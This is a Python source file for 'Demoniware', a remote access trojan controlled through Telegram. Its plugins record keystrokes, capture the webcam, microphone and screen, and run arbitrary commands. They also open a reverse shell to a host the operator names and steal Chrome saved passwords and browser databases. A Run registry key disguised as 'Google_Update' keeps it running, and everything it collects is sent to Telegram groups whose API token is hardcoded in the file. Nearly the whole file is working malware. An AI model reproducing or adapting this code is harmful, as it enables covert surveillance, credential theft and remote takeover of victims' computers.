from datetime import datetime
import tempfile
import textwrap
import uuid
import telepot
import os
import sys
import platform

import os
import psutil
import subprocess
import random
from pynput.keyboard import Key, Listener, Controller
from threading import Thread
import pygame
import pygame.camera

try:
    import win32crypt
    from winreg import *
    win32_available = True
except:
    win32_available = False

import socket

from threading import Thread

from zipfile import ZipFile
import os
import sqlite3
import psutil

import pyaudio
import wave

try:
    import win32crypt
    from winreg import *
    win32_available = True
except:
    win32_available = False

import logging
from time import sleep
import pyscreenshot as ImageGrab
from time import sleep, gmtime, strftime

from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

from threading import Thread
import os
import glob
import platform
import getpass
import requests
import socket

class Plugin(object):

    name = 'Generic Plugin'
    version = '0.0.0'

    def __init__(self, bot):
        self.commands = []
        self.bot = bot

    def add_command(self, command):
        if isinstance(command, Command):
            self.commands.append(command)

    def get_command(self, command):
        for cmd in self.commands:
            if cmd.name == command:
                return cmd


    def get_usage(self, command):
        return self.get_command(command).usage


    def get_description(self, command):
        return self.get_command(command).description

    def setup(self):
        pass

    def run(self):
        raise NotImplemented



class Command(object):

    def __init__(self, name, description='', usage=''):
        self.name = name
        self.description = description
        self.usage = usage

    def description(self, msg=None):
        if not msg:
            return self.description
        else:
            self.description = msg


    def usage(self, msg=None):
        if not msg:
            return self.usage
        else:
            self.usage = msg


class system(Plugin):

    name = 'System Utils'
    version = '1.0.0'

    def setup(self):

        c = Command('/ls', usage='HOSTNAME /ls [pattern] - lists current directory (cwd-like), if [pattern] is specified, simulates ls behaviour')
        self.add_command(c)

        c = Command('/info', usage='HOSTNAME /info - displays system info')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/info':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_info, args=tuple(arg_list))
            t.start()
        elif command in ['/ls']:
            arg_list = [chat_id]

            if len(args) > 0:
                arg_list += args
            else:
                arg_list += [os.getcwd()]

            t = Thread(target=self.handle_ls, args=tuple(arg_list))
            t.start()

    def handle_info(self, chat_id):
        try:
            infos = []
            infos.append('[+] - System Infos - [+]')
            infos.append('User: {user}'.format(user=getpass.getuser()))
            infos.append('Current Folder: {cwd}'.format(cwd=os.getcwd()))
            infos.append('Plataform: {platform}'.format(platform=platform.platform()))
            if self.bot.platform == 'win32':
                infos.append('Processor: {processor}'.format(processor=platform.processor()))
            elif self.bot.platform == 'linux' or self.bot.platform == 'linux2':
                infos.append('Uname: {uname}'.format(uname=' '.join(platform.uname())))
            infos.append('Hostname: {hostname}'.format(hostname=platform.node()))
            infos.append('Local IP: {local_ip}'.format(local_ip=socket.gethostbyname(socket.gethostname())))

            infos.append('[+] - External IP Infos - [+]')
            r = requests.get('http://ip-api.com/json')
            result = r.json()

            infos.append('External IP: {query}'.format(**result))
            infos.append('City: {city}'.format(**result))
            infos.append('Region: {region}'.format(**result))
            infos.append('Region Name: {regionName}'.format(**result))
            infos.append('Latitude: {lat}'.format(**result))
            infos.append('Longitude: {lon}'.format(**result))
            infos.append('ISP: {isp}'.format(**result))
            return self.bot.send_message(chat_id, '\n'.join(infos))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def handle_ls(self, chat_id, pattern):
        try:
            files = [name for name in glob.glob(pattern)]
            return self.bot.send_message(chat_id, '\n'.join(files))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))






class suicide(Plugin):

    name = 'Suicide'
    version = '1.0.0'

    def setup(self):

        self.quotes = ['Give me my robe, put on my crown', 'I am dying, Egypt, dying', 'O happy dagger!', 'O true apothecary!', 'One that loved not wisely but too well', 'To be, or not to be', 'To sleep, perchance to dream', 'Tomorrow, and tomorrow, and tomorrow']

        c = Command('/suicide', usage='HOSTNAME /suicide [delay] - commit suicide with an option [delay], in seconds')
        self.add_command(c)


    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/suicide':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_suicide, args=tuple(arg_list))
            t.start()

    def handle_suicide(self, chat_id, delay=None):
        try:
            self.bot.send_message(chat_id, random.choice(self.quotes))
            sleep(5)
            os._exit(0)
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


class reverse_shell(Plugin):

    name = 'Reverse Shell'
    version = '1.0.0'

    def setup(self):

        c = Command('/rev_shell', usage='HOSTNAME /rev_shell <host> <port> - reverse shell')
        self.add_command(c)


    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/rev_shell':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_rev_shell, args=tuple(arg_list))
            t.start()

    def handle_rev_shell(self, chat_id, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            self.bot.send_message(chat_id, 'Reverse shell started at host {}:{}'.format(ip, port))
            while True:
                s.send('{} $ '.format(self.bot.node).encode('utf-8'))
                data = s.recv(self.bot.socket_buffer_size).decode('utf-8', 'ignore')
                if data == "exit\n":
                    s.send('Reverse shell closed.\n'.encode('utf-8'))
                    self.bot.send_message(chat_id, 'Reverse shell closed')
                    break
                comm = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                s.send(STDOUT)
                s.send(STDERR)
                return
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e).decode('utf-8', 'ignore')))

        s.close()



class screenshot(Plugin):

    name = 'Screenshot'
    version = '1.0.0'

    def setup(self):

        c = Command('/screenshot', usage='HOSTNAME /screenshot [delay] - takes a screenshot with an option [delay], in seconds')
        self.add_command(c)


    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/screenshot':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_screenshot, args=tuple(arg_list))
            t.start()

    def handle_screenshot(self, chat_id, delay=None):
        try:
            fname = self.bot.get_tmp(self.bot.generate_file_name('screenshot.png'))

            if delay:
                self.bot.send_message(chat_id, 'Will take screenshot after {} seconds'.format(delay))
                sleep(int(delay))
            else:
                self.bot.send_message(chat_id, 'Taking screenshot...')

            ImageGrab.grab().save(fname, "PNG")
            f = open(fname, 'rb')
            self.bot.bot.sendPhoto(chat_id, f)
            f.close()
            os.remove(fname)
            return
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

class proc(Plugin):

    name = 'Proc Utils'
    version = '1.0.0'

    def setup(self):

        c = Command('/cmd', usage='HOSTNAME /cmd <command> - execute a system command')
        self.add_command(c)

        c = Command('/process', usage='HOSTNAME /process [filter] - list system processes, optionally filtering with [filter]')
        self.add_command(c)

        c = Command('/kill', usage='HOSTNAME /kill <pid> - kill a process by PID')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/cmd':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_cmd, args=tuple(arg_list))
            t.start()
        elif command == '/process':
            arg_list = [chat_id]
            arg_list += [' '.join(args)]

            t = Thread(target=self.handle_process, args=tuple(arg_list))
            t.start()
        elif command == '/kill':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_kill, args=tuple(arg_list))
            t.start()

    def handle_cmd(self, chat_id, cmd):
        try:
            if self.bot.platform == 'win32':
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                env = os.environ
                txt = subprocess.check_output(cmd, stdin=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=si, env=env)
            elif self.bot.platform in ['linux', 'linux2']:
                print(cmd)
                txt = subprocess.check_output(cmd)

            return self.bot.send_message(chat_id, txt.decode('utf-8', 'ignore'))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

    def handle_process(self, chat_id, grep=''):
        try:
            result = []
            process = psutil.pids()
            for pid in process:
                p = psutil.Process(pid)
                if grep in p.name() or grep in str(pid):
                    result.append('{} {}'.format(str(pid), p.name()))
            if len(result) == 0:
                result.append('No process found matching the filter "{}"'.format(grep))
            return self.bot.send_message(chat_id, '\n'.join(result))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

    def handle_kill(self, chat_id, pid):
        try:
            p = psutil.Process(int(pid))
            p.terminate()
            return self.bot.send_message(chat_id, "Process terminated!")
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))




class persistence(Plugin):

    name = 'Persistence'
    version = '1.0.0'

    def setup(self):

        c = Command('/persistence', usage='HOSTNAME /persistence - make Demoniware persistent')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/persistence':
            arg_list = [chat_id]

            tempdir = os.environ.get('TEMP')
            fileName = os.path.basename(sys.executable)
            run = "Software\Microsoft\Windows\CurrentVersion\Run"

            arg_list += [tempdir, fileName, run]

            t = Thread(target=self.handle_persistence, args=tuple(arg_list))
            t.start()

    def handle_persistence(self, chat_id, tempdir, fileName, run):
        key = OpenKey(HKEY_CURRENT_USER, run)
        runkey = []
        try:
            i = 0
            while True:
                subkey = EnumValue(key, i)
                runkey.append(subkey[0])
                i += 1
        except WindowsError:
            pass


        if 'Google_Update' not in runkey:
            try:
                os.system('copy {} {}'.format(fileName, tempdir))
                fullpath = os.path.join(tempdir, fileName)
                key = OpenKey(HKEY_CURRENT_USER, run, 0, KEY_ALL_ACCESS)
                SetValueEx(key, 'Google_Update', 0, REG_SZ, fullpath)
                key.Close()
                self.send_message(chat_id, 'Persistence created!')
            except WindowsError as e:
                self.send_message(chat_id, 'Error creating register: {}'.format(str(e)))
        else:
            self.send_message(chat_id, 'Persistence register already created!')



class keylogger(Plugin):

    name = 'Keylogger'
    version = '1.0.0'

    def setup(self):

        self.current_file_name = ''
        self.status = 'STOPPED'

        c = Command('/keylogger', usage='HOSTNAME /keylogger <start/stop> - start/stop the keylogger, sending the recorded file to Telegram if stopping')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/keylogger':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_keylogger, args=tuple(arg_list))
            t.start()


    def handle_keylogger(self, chat_id, flag):
        if self.status == 'STOPPED':
            self.current_file_name = self.bot.generate_file_name('keylogger.txt')
        fname = self.bot.get_tmp(self.current_file_name)
        t = Thread(target=self.keylogger)

        if flag == 'start':
            try:
                if t.isAlive() is False:
                    t.start()
                    self.status = 'STARTED'
                    return self.bot.send_message(chat_id, "Keylogger started!")
            except Exception as e:
                return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

        elif flag == 'stop':
            try:
                keyboard = Controller()
                keyboard.press(Key.esc)
                f = open(fname)
                self.bot.bot.sendDocument(chat_id, f)
                f.close()
                os.remove(fname)
                self.status = 'STOPPED'
                self.current_file_name = ''
                return self.bot.send_message(chat_id, "Keylogger stopped!")
            except Exception as e:
                return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def keylogger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        f = self.bot.get_tmp(self.current_file_name)
        with open(f, 'a') as saida:
            if key == Key.space:
                saida.write(' ')
            elif key == Key.enter:
                saida.write('\n')
            elif key == Key.tab:
                saida.write('\t')
            elif key == Key.esc:
                return False
            else:
                key = str(key)
                if 'Key' not in key:
                    key = str(key).split("'")[1]
                    saida.write(key)


class microphone(Plugin):

    name = 'Microphone'
    version = '1.0.0'

    def setup(self):

        c = Command('/record_mic', usage='HOSTNAME /record_mic <seconds> - record <seconds> seconds of audio from microphone')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/record_mic':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_record_mic, args=tuple(arg_list))
            t.start()

    def handle_record_mic(self, chat_id, seconds):
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = int(seconds)

        WAVE_OUTPUT_FILENAME = self.bot.get_tmp(self.bot.generate_file_name('microphone_recording.wav'))

        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            self.bot.send_message(chat_id, 'Recording...')
            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            # stop Recording
            stream.stop_stream()
            stream.close()
            audio.terminate()
            self.bot.send_message(chat_id, 'Finished recording!')

            waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            waveFile.setnchannels(CHANNELS)
            waveFile.setsampwidth(audio.get_sample_size(FORMAT))
            waveFile.setframerate(RATE)
            waveFile.writeframes(b''.join(frames))
            waveFile.close()

            f = open(WAVE_OUTPUT_FILENAME, 'rb')
            self.bot.bot.sendAudio(chat_id, f)
            f.close()
            os.remove(WAVE_OUTPUT_FILENAME)
            return
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


class chrome(Plugin):

    name = 'Chrome Passwords'
    version = '1.0.0'

    def setup(self):

        self.databases = ['Bookmarks', 'Cookies', 'History', 'Login Data', 'Preferences', 'Web Data']

        c = Command('/chrome_enum', usage='HOSTNAME /chrome_enum - grab Google Chrome stored credentials')
        self.add_command(c)

        c = Command('/chrome_data', usage='HOSTNAME /chrome_data - grab Google Chrome database files')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/chrome_enum':
            arg_list = [chat_id]

            t = Thread(target=self.handle_chrome_enum, args=tuple(arg_list))
            t.start()

        elif command == '/chrome_data':
            arg_list = [chat_id]

            t = Thread(target=self.handle_chrome_data, args=tuple(arg_list))
            t.start()

    def handle_chrome_data(self, chat_id):
        try:
            process = psutil.pids()
            for x in process:
                try:
                    p = psutil.Process(x)
                    if 'chrome' in p.name().lower():
                        msg = 'Google PID %d terminated' %x
                        self.bot.send_message(chat_id, msg)
                        p.terminate()
                except Exception as e:
                    pass
            self.bot.send_message(chat_id, 'Gathering data...')
            if self.bot.platform == 'win32':
                path = os.path.join(os.getenv('localappdata'), 'Google\\Chrome\\User Data\\Default')
            elif self.bot.platform in ['linux', 'linux2']:
                path = os.path.join(os.environ.get('HOME'), '.config/google-chrome/Default')

            zname = self.bot.generate_file_name('chrome_data.zip')


            with ZipFile(zname, 'w') as z:
                for db in self.databases:
                    try:
                        z.write(os.path.join(path, db))
                    except:
                        continue

            with open(zname, 'rb') as f:
                self.bot.bot.sendDocument(chat_id, f)

            os.remove(zname)
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def handle_chrome_enum(self, chat_id):
        try:
            passwd = self.bot.generate_file_name('passw.txt')
            process = psutil.pids()
            for x in process:
                try:
                    p = psutil.Process(x)
                    if 'chrome' in p.name().lower():
                        msg = 'Google PID %d terminated' %x
                        self.bot.send_message(chat_id, msg)
                        p.terminate()
                except Exception as e:
                    pass

            credentials = []
            if self.bot.platform == 'win32':
                path = os.path.join(os.getenv('localappdata'), 'Google\\Chrome\\User Data\\Default')
            elif self.bot.platform in ['linux', 'linux2']:
                path = os.path.join(os.environ.get('HOME'), '.config/google-chrome/Default')
            if (os.path.isdir(path)):
                connection = sqlite3.connect(os.path.join(path, "Login Data"))
                print(os.path.join(path, "Login Data"))
                try:
                    with connection:
                        cursor = connection.cursor()
                        v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                        value = v.fetchall()

                    for information in value:
                        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1] if win32_available else information[2]
                        if password:
                            credentials.append('URL: {}'.format(information[0]))
                            credentials.append('Username: {}'.format(information[1]))
                            credentials.append('Password: {}'.format(str(password)))
                            credentials.append(' ')
                    f = open(passwd, 'w')
                    f.write('\n'.join(credentials))
                    f.close()
                    self.bot.bot.sendDocument(chat_id, open(passwd))
                    os.remove(passwd)
                except Exception as e:
                    self.bot.send_message(chat_id, str(e))
            else:
                self.bot.send_message(chat_id, 'Chrome Doesn\'t exists')
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


class download_upload(Plugin):

    name = 'Download & Upload'
    version = '1.0.0'

    def setup(self):

        c = Command('/upload', usage='HOSTNAME /upload <file> - upload <file> to Telegram')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/upload':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_upload, args=tuple(arg_list))
            t.start()


    def handle_upload(self, chat_id, fname):
        try:
            f = open(fname, 'rb')
            return self.bot.bot.sendDocument(chat_id, f)
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


class camera(Plugin):

    name = 'Camera'
    version = '1.0.0'

    def setup(self):

        pygame.init()
        pygame.camera.init()

        c = Command('/cam_stream', usage='HOSTNAME /cam_stream <host> <port> <id> - stream webcam to remote host')
        self.add_command(c)

        c = Command('/cam_stream_stop', usage='HOSTNAME /cam_stream_stop - stop webcam streaming')
        self.add_command(c)

        c = Command('/cameras', usage='HOSTNAME /cameras - list cameras by ID number')
        self.add_command(c)

        c = Command('/snapshot', usage='HOSTNAME /snapshot <id> - take a picture from the camera #<id>')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/cam_stream':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_cam_stream, args=tuple(arg_list))
            t.start()

        if command == '/cam_stream_stop':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_cam_stream_stop)
            t.start()

        if command == '/cameras':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_cameras, args=tuple(arg_list))
            t.start()
        if command == '/snapshot':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_snapshot, args=tuple(arg_list))
            t.start()

    def handle_cameras(self, chat_id):
        try:
            cameras = ['Camera ID: {}'.format(x) for x in pygame.camera.list_cameras()]

            return self.bot.send_message(chat_id, '\n'.join(cameras))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def handle_snapshot(self, chat_id, cam_id):
        self.bot.send_message(chat_id, 'Taking a picture!')
        fname = self.bot.get_tmp(self.bot.generate_file_name('snapshot.png'))
        try:
            self.cam = pygame.camera.Camera(cam_id, (640,480))
            self.cam.start()
            image = self.cam.get_image()
            self.cam.stop()
            pygame.image.save(image, fname)

            f = open(fname, 'rb')

            self.bot.bot.sendPhoto(chat_id, f)

            f.close()

        except Exception as e:
            self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

    def handle_cam_stream_stop(self):
        self.stop = True

    def handle_cam_stream(self, chat_id, host, port, cam_id):
        try:
            self.cam = pygame.camera.Camera(cam_id, (640, 480))
            self.cam.start()

            self.stop = False

            self.bot.send_message(chat_id, 'Webcam Streaming started, sending {} data to server {}:{}'.format(cam_id, host, port))

            while not self.stop:
                s = socket.socket()
                s.connect((host, int(port)))

                image = self.cam.get_image()

                data = pygame.image.tostring(image, 'RGB')

                s.sendall(data)

                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        return

            self.cam.stop()
            return self.bot.send_message(chat_id, 'Webcam Streaming stopped')

        except Exception as e:
            self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))



class Demoniware(object):


    def __init__(self, config_file, api_key=None, allowed_groups=None):
        formatter = logging.Formatter('%(asctime)s %(message)s')
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)

        ch_stream = logging.StreamHandler()
        ch_stream.setLevel(logging.INFO)
        ch_stream.setFormatter(formatter)

        self.logger.addHandler(ch_stream)

        self.logger.info('Demoniware is rising...')


        self.api_key = api_key if api_key else '272769645:AAHaAlus1Bh4xMAJD7crcEwRpe7JxHpy6I0'
        self.allowed_groups = allowed_groups if allowed_groups else [-167279752,-155034552]
        self.max_message_length = 4096
        self.socket_buffer_size = 1024

        self.secure = False

        self.bot = telepot.Bot(self.api_key)
        self.platform = sys.platform
        self.system = platform.system()

        self.accept_download = False

        self.start_time = datetime.now()

        self.node = '{}__{}'.format(platform.node(), uuid.getnode())

        self.plugin_list = ['camera', 'chrome', 'download_upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system']

        self.plugins = {}

        self.command_routes = {}

    def load_plugins(self, import_type='dynamic'):
        if import_type == 'dynamic':
            for p in self.plugin_list:
                try:
                    self.logger.info('[*] Loading plugin: {}'.format(p))
                    self.plugins[p] = load_plugin(self, p)
                    new_cmd = []

                    self.plugins[p].setup()

                    for command in self.plugins[p].commands:
                        if self.command_routes.get(command.name, None):
                            self.logger.warning('[-] Duplicated command "{}" for plugins "{}" and "{}", prioritizing first'.format(command.name, self.command_routes[command.name], p))
                        else:
                            self.command_routes[command.name] = p
                            new_cmd.append(command.name)

                    self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(p, self.plugins[p].name, self.plugins[p].version, new_cmd))
                except Exception as e:
                    self.logger.error('[-] Error loading plugin: {} ({})'.format(p, str(e)))
                    continue
        elif import_type == 'static':

            for m in [camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system]:
                name = m.__name__.replace('plugins.', '')

                try:
                    self.logger.info('[*] Loading plugin: {}'.format(name))
                    new_cmd = []
                    self.plugins[name] = m(self)
                    self.plugins[name].setup()

                    for command in self.plugins[name].commands:
                        if self.command_routes.get(command.name, None):
                            self.logger.warning('[-] Duplicated command "{}" for plugins "{}" and "{}", prioritizing first'.format(command.name, self.command_routes[command.name], name))
                        else:
                            self.command_routes[command.name] = name
                            new_cmd.append(command.name)

                        self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(name, self.plugins[name].name, self.plugins[name].version, new_cmd))
                except Exception as e:
                    self.logger.error('[-] Error loading plugin: {} ({})'.format(name, str(e)))

    def send_message(self, chat_id, msg):
        chunks = textwrap.wrap(msg, width=self.max_message_length - 500, expand_tabs=False, replace_whitespace=False, drop_whitespace=False, break_long_words=True)

        for chunk in chunks:
            self.bot.sendMessage(chat_id, '[{}] {}'.format(self.node, chunk))

    def handle(self, msg):
        content_type, chat_type, chat_id = telepot.glance(msg)

        if chat_type == 'group':
            if chat_id in self.allowed_groups:
                if content_type == 'text':
                    if self.secure:
                        self.check_sign(msg)
                    else:
                        self.actions(msg['text'], chat_id)
                elif content_type == 'document':
                    if self.accept_download:
                        self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
                        self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
                        self.accept_download = False
        else:
            self.send_message(chat_id, 'Fuck off!')

    def check_sign(self, msg):
        cmd = msg['text'].split()
        chat_id = msg['chat']['id']

        #Change to your public key
        public = '''-----BEGIN PUBLIC KEY-----
        MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqJpBxEQ53eNjxj3lS1cZ21g+8
        wyY6ZailtjKKvu8Q8B7bKlZI0/v13SPGGose2EY54//ceRAfSnZ4XMXLHBzVq2+I
        +ryUypsDhBhTPGgOLdnX2sPU39xSQixhkB8n1T4Dlj/mdfVBS2bgjjWcSvXkCULN
        rKzcuJk/193tuTcK3wIDAQAB
        -----END PUBLIC KEY-----
        '''

        msg = ' '.join(cmd[1:])
        key = RSA.importKey(public)
        public = key.publickey()
        now = strftime("%Y-%m-%d %H:%M", gmtime())
        msg_final = '{}{}'.format(msg, now).encode('utf-8')
        hash_msg = SHA256.new(msg_final).digest()
        signature = (int(cmd[0]),)
        if public.verify(hash_msg, signature):
            self.actions(' '.join(cmd[1:]), chat_id)
        else:
            self.send_message(chat_id, 'Get out bastard')

    def actions(self, msg, chat_id):
        cmd = msg.split()

        if '/hosts' in cmd[0]:
            self.send_message(chat_id, '{} [started at {}]'.format(self.node, self.start_time))

        elif cmd[0].lower() in self.node.lower() and len(cmd) >= 2:
            if cmd[1] == '/accept_download':
                self.accept_download = True
                self.send_message(chat_id, 'Waiting for document...')
            if cmd[1] in self.command_routes.keys():
                pname = self.command_routes[cmd[1]]
                plugin = self.plugins[pname]

                self.logger.debug('[*] Routing command: "{}" => "{}"'.format(cmd[1], pname))

                plugin.handle(cmd[1], chat_id, *cmd[2:])



        elif '/help' in cmd[0]:
            msg = """[+] - Commands Available - [+]
            /help - show this message
            /hosts - show the hostname of all hosts availables
            HOSTNAME /accept_download - accepts the next uploaded document"""

            for plugin in self.plugins.keys():
                msg += """\n\n[+] - Plugin: {plugin_name} - [+]""".format(plugin_name=plugin)

                for cmd in self.plugins[plugin].commands:
                    msg += '\n{usage}'.format(usage=self.plugins[plugin].get_usage(cmd.name))

            self.send_message(chat_id, msg)


    def get_tmp(self, fname):
        tmp = tempfile.gettempdir()
        return os.path.join(tmp, fname)

    def generate_file_name(self, fname):
        return '{}__{}__{}'.format(platform.node(), datetime.now().strftime('%Y%m%d_%H%M%S'), fname)


    def not_implemented(self, chat_id):
        return self.send_message(chat_id, 'Not yet implemented on {}'.format(self.platform))

    def main(self):
        msg = 'NEW {} HOST'.format(self.system, self.node)

        for group in self.allowed_groups:
            try:
                self.send_message(group, msg)
            except:
                continue

        self.bot.message_loop(self.handle)
        while 1:
            sleep(10)

if __name__ == "__main__":

    demon = Demoniware('demoniware.ini')
    demon.load_plugins('static')
    demon.main()
